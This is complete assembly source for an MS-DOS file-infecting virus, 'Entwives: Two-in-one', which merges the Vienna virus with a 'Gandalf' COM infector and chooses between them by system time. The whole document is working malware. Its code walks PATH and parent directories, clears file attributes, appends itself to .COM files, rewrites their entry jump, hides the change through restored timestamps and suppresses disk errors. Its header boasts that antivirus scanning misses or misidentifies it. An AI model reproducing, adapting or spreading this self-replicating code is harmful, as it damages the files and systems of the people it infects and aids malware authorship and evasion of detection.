;                      Entwives: Two-in-one by Ender
; This virus is a combination of a G^2 COM infector, called Gandalf and 
;   the popular Vienna strain.  This virus runs the Vienna code 7/8 
;   times and the Gandalf code the remaining 1/8.  The Vienna viral code
;   should load the infected file with Vienna and Gandalf while the 
;   Gandalf code will only load itself into the file.
; Please note that McAfee shows Lisbon and 1014 virus when scanning
;   a file infected by this virus.  Gandalf is invisible.  At least on
;   an older version it is.
;------------------------------------------------------------------------------

; First is Vienna
; ~~~~~~~~~~~~~~~

.model tiny

MOV_CX  MACRO   X
        DB      0B9H
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

;*****************************************************************************
;Start out with a JMP around the remains of the original .COM file, into the
;virus. The actual .COM file was just an INT 20, followed by a bunch of NOPS.
;The rest of the file (first 3 bytes) are stored in the virus data area.
;*****************************************************************************

VCODE:  JMP     virus

;This was the rest  of the original .COM file. Tiny and simple, this time

        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

;************************************************************
;              The actual virus starts here
;************************************************************

v_start equ     $

virus:
; ******************************************************************
;                       Determine which Viral code to use
;                                   BY
;                          Getting current system time
;*******************************************************************

        MOV     AH,2CH
        INT     21H

        AND     DH,7                    ;Last 3 bits 0? (once in eight)
        JNZ     actvir                  ; If 7/8 use Vienna code
        JMP     carrier                 ; If 1/8 use Gandalf code

;*******************************************************************
; This is the special "one in eight" infection. If the above line were in
;  its original form, the Gandalf code would be run 1/8 of the time, and
;  rather than appending a copy of Vienna+Gandalf virus to the .COM file,
;  the file would get the Gandalf virus.  Why?  Just for the Hell of it!
;*******************************************************************

actvir: PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
                                        ; The 2nd and 3rd bytes get modified.
        CLD                             ;Pointers will be auto INcremented
        MOV     SI,DX                   ;Access data as offset from SI
        ADD     SI,first_3              ;Point to original 1st 3 bytes of .COM
        MOV     DI,OFFSET 100H          ;`cause all .COM files start at 100H
        MOV     CX,3
        REPZ    MOVSB                   ;Restore original first 3 bytes of .COM
        MOV     SI,DX                   ;Keep SI pointing to the data area

;*************************************************************
;               Get DTA address into ES:BX
;*************************************************************

        PUSH    ES
        MOV     AH,2FH
        INT     21H

;*************************************************************
;                    Save the DTA address
;*************************************************************

        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         ;Save the DTA address

        POP     ES

;*************************************************************
;        Set DTA to point inside the virus data area
;*************************************************************

        MOV     DX,dta                  ;Offset of new DTA in virus data area
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Compute DTA address
        MOV     AH,1AH
        INT     21H                     ;Set new DTA to inside our own code

        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    ;ES:DI points to environment

;************************************************************
;        Find the "PATH=" string in the environment
;************************************************************

find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

;************************************************************
;       Loop to check for the next four characters
;************************************************************

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        LOOP    check_next_4            ;Loop to check the next character

        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok

;**********************************************************
;     Look in the PATH for more subdirectories, if any
;**********************************************************

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done

;**********************************************************
;    Here if there are more subdirectories in the path
;**********************************************************

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace

;***********************************************************
;      Move subdirectory name into file name workspace
;***********************************************************

move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

;******************************************************************
; Mark the fact that we're looking through the final subdirectory
;******************************************************************

moved_last_one:
        MOV     SI,0

;******************************************************************
;              Here after we've moved a subdirectory
;******************************************************************

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP

;******************************************************************
;             Make sure subdirectory ends in a "\"
;******************************************************************

        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB

;******************************************************************
;     Here after we know there's a backslash at end of subdir
;******************************************************************

slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace

        MOV     SI,BX

;*******************************************************************
;                 Find first string matching *.COM
;*******************************************************************

        MOV     AH,4EH
        MOV     DX,wrk_spc
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H

        JMP     SHORT   find_first

;*******************************************************************
;              Find next ASCIIZ string matching *.COM
;*******************************************************************

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

;*******************************************************************
;                      Here when we find a file
;*******************************************************************

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1FH                  ;Mask to remove all but seconds
        CMP     AL,1FH                  ;62 seconds -> already infected
        JZ      find_next               ;If so, go find another file

        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one

        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one

        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

;********************************************************************
;                Move the name to the end of the path
;********************************************************************

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00

;********************************************************************
;                        Get File Attributes
;********************************************************************

        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H

        MOV     [SI+old_att],CX         ;Save the old attributes

;********************************************************************
;         Rewrite the attributes to allow writing to the file
;********************************************************************

        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H

;********************************************************************
;                Open Read/Write channel to the file
;********************************************************************

        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H

        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

;*******************************************************************
;                        Get the file date & time
;*******************************************************************

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H

        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date

;******************************************************************
;      Here's where we infect a .COM file with this virus
;******************************************************************

infectcom:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
;       NOP                     ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area

        JB      fix_time_stamp  ;Quit, if read failed

        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not

;******************************************************************
;              Move file pointer to end of file
;******************************************************************

        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H

        JB      fix_time_stamp  ;Quit, if it didn't work

        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction

        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm

;*******************************************************************
;                    Write virus code to file
;*******************************************************************

        MOV     AH,40H

        MOV_CX  virlen                  ;Length of virus, in bytes

        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ; address of virus code in memory
        INT     21H

        JB      fix_time_stamp          ;Jump if error

        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error

;**********************************************************************
;                Move file pointer to beginning of the file
;**********************************************************************

        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H

        JB      fix_time_stamp          ;Jump if error

;**********************************************************************
;              Write the 3 byte JMP at the start of the file
;**********************************************************************

        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
        INT     21H

;**********************************************************************
;       Restore old file date & time, with seconds modified to 62
;**********************************************************************

fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1FH                  ;Seconds = 31/30 min = 62 seconds
        MOV     AX,OFFSET 5701H
        INT     21H

;**********************************************************************
;                              Close File
;**********************************************************************

        MOV     AH,3EH
        INT     21H

;**********************************************************************
;                     Restore Old File Attributes
;**********************************************************************

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
;       NOP                             ;MASM will add this NOP
        ADD     DX,SI                   ;DX points to \path\name in workspace
        INT     21H

;**********************************************************************
;              Here when it's time to close it up & end
;**********************************************************************

all_done:
        PUSH    DS

;**********************************************************************
;                         Restore old DTA
;**********************************************************************

        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H

        POP     DS

;*************************************************************************
; Clear registers used, & do a weird kind of JMP 100. The weirdness comes
;  in since the address in a real JMP 100 is an offset, and the offset
;  varies from one infected file to the next. By PUSHing an 0100H onto the
;  stack, we can RET to address 0100H just as though we JMPed there.
;**********************************************************************

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI

        RET     0FFFFH

; This is GANDALF.  The second of the two viruses which the file could
;   be infected by.  Gandalf, unlike Vienna, only will infect with it's
;   own code, instead of the code for both it and Vienna.

; Kudos to G^2 for the code for Gandalf
;            Gandalf by Ender

carrier:
        db      0E9h,0,0                ; jmp start

start:
        call    next
next:
        pop     bp
        sub     bp, offset next

        mov     ah, 0047h               ; Get directory
        lea     si, [bp+offset origdir+1]
        cwd                             ; Default drive
        int     0021h

        lea     dx, [bp+offset newDTA]
        mov     ah, 001Ah               ; Set DTA
        int     0021h

        mov     ax, 3524h
        int     0021h
        push    es
        push    bx

        lea     dx, [bp+INT24]          ; ASSumes ds=cs
        mov     ax, 2524h
        int     0021h

        push    cs
        pop     es

restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3]
        movsb
        movsw

        mov     byte ptr [bp+numinfect], 0000h
traverse_loop:
        lea     dx, [bp+offset COMmask]
        call    infect
        cmp     [bp+numinfect], 0007h
        jae     exit_traverse           ; exit if enough infected

        mov     ah, 003Bh               ; CHDIR
        lea     dx, [bp+offset dot_dot] ; go to previous dir
        int     0021h
        jnc     traverse_loop           ; loop if no error

exit_traverse:

        lea     si, [bp+offset origdir]
        mov     byte ptr [si], '\'
        mov     ah, 003Bh               ; restore directory
        xchg    dx, si
        int     0021h

        pop     dx
        pop     ds
        mov     ax, 2524h
        int     0021h


        mov     dx, 0080h               ; in the PSP
        mov     ah, 001Ah               ; restore DTA to default
        int     0021h

return:
        ret

old3            db      0cdh,20h,0

INT24:
        mov     al, 0003h
        iret

infect:
        mov     cx, 0007h               ; all files
        mov     ah, 004Eh               ; find first
findfirstnext:
        int     0021h
        jc      return
        mov     ax, 4300h
        lea     dx, [bp+newDTA+30]
        int     0021h
        jc      return
        push    cx
        push    dx

        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0021h

        mov     ax, 3D02h
        lea     dx, [bp+newDTA+30]
        int     0021h
        mov     bx, ax                  ; xchg ax,bx is more efficient

        mov     ax, 5700h               ; get file time/date
        int     0021h
        push    cx
        push    dx

        mov     ah, 003Fh
        mov     cx, 001Ah
        lea     dx, [bp+offset readbuffer]
        int     0021h

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     0021h

        cmp     word ptr [bp+offset readbuffer], 'ZM'
        jz      jmp_close
        mov     cx, word ptr [bp+offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jl      skipp
jmp_close:
        jmp     close
skipp:

        cmp     ax, 65535-(endheap-start) ; check if too large
        ja      jmp_close               ; Exit if so

        cmp     ax, (heap-start)        ; check if too small
        jb      jmp_close               ; Exit if so

        lea     si, [bp+offset readbuffer]
        lea     di, [bp+offset old3]
        movsb
        movsw

        sub     ax, 0003h
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [bp+offset readbuffer], dl
        lea     dx, [bp+offset start]
        mov     ah, 0040h               ; concatenate virus
        mov     cx, heap-start
        int     0021h

        xor     cx, cx
        mov     ax, 4200h
        xor     dx, dx
        int     0021h


        mov     cx, 0003h
        lea     dx, [bp+offset readbuffer]
        mov     ah, 0040h
        int     0021h

        inc     [bp+numinfect]

close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0021h

        mov     ah, 003Eh
        int     0021h

        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     cx                      ; attributes from stack
        int     0021h

        mov     ah, 004Fh               ; find next
        jmp     findfirstnext

; Data for Gandalf Virus
author          db      'Entwives: Two-in-one G by Ender'
COMmask         db      '*.COM',0
dot_dot         db      '..',0

heap:
newDTA          db      43 dup (?)
origdir         db      65 dup (?)
numinfect       db      ?
readbuffer      db      1ah dup (?)
endheap:

; Data from the Vienna virus
;************************************************************************
;The virus data starts here. It's accessed off the SI register, per the
; comments as shown
;************************************************************************

vir_dat EQU     $

        ;Use this with (SI + old_dta)
olddta_ DW      0                       ;Old DTA offset

        ;Use this with (SI + old_dts)
olddts_ DW      0                       ;Old DTA segment

        ;Use this with (SI + old_tim)
oldtim_ DW      0                       ;Old Time

        ;Use this with (SI + ol_date)
oldate_ DW      0                       ;Old date

        ;Use this with (SI + old_att)
oldatt_ DW      0                       ;Old file attributes

;Here's where the first three bytes of the original .COM file go.(SI + first_3)

first3_ EQU     $
        INT     20H
        NOP

;Here's where the new JMP instruction is worked out

        ;Use this with (SI + jmp_op)
jmpop_  DB      0E9H                    ;Start of JMP instruction

        ;Use this with (SI + jmp_dsp)
jmpdsp_ DW      0                       ;The displacement part

;This is the type of file  we're looking to infect. (SI + f_spec)

fspec_  DB      '*.COM',0

        ;Use this with (SI + path_ad)
pathad_ DW      0                       ;Path address

        ;Use this with (SI + nam_ptr)
namptr_ DW      0                       ;Pointer to start of file name

        ;Use this with (SI + env_str)
envstr_ DB      'PATH='                 ;Find this in the environment

        ;File name workspace (SI + wrk_spc)
wrkspc_ DB      40h dup (0)

        ;Use this with (SI + dta)
dta_    DB      16h dup (0)             ;Temporary DTA goes here

        ;Use this with (SI + dta_tim)
dtatim_ DW      0,0                     ;Time stamp in DTA

        ;Use this with (SI + dta_len)
dtalen_ DW      0,0                     ;File length in the DTA

        ;Use this with (SI + dta_nam)
dtanam_ DB      0Dh dup (0)             ;File name in the DTA

creditauthor  DB  "Entwives: Two-in-one V by Ender"  ; My credit

lst_byt EQU     $                       ;All lines that assemble into code are
                                        ;  above this one
        
;*****************************************************************************
;The virus needs to know a few details about its own size and the size of its
; code portion. Let the assembler figure out these sizes automatically.
;*****************************************************************************

virlen  =       lst_byt - v_start       ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start       ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2   ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H ;Code length + 100h, for PSP

;*****************************************************************************
;Because this code is being appended to the end of an executable file, the
; exact address of its variables cannot be known. All are accessed as offsets
; from SI, which is represented as vir_dat in the below declarations.
;*****************************************************************************

old_dta =       olddta_ - vir_dat       ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat       ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat       ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat       ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat       ;Displacement to old attributes
first_3 =       first3_ - vir_dat       ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat       ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat       ;Displacement to the 2nd 2 bytes of JMP
f_spec  =       fspec_  - vir_dat       ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat       ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat       ;Displacement to the filename pointer
env_str =       envstr_ - vir_dat       ;Displacement to the "PATH=" string
wrk_spc =       wrkspc_ - vir_dat       ;Displacement to the filename workspace
dta     =       dta_    - vir_dat       ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat       ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat       ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat       ;Displacement to the name in the DTA

        CODE    ENDS
END     VCODE

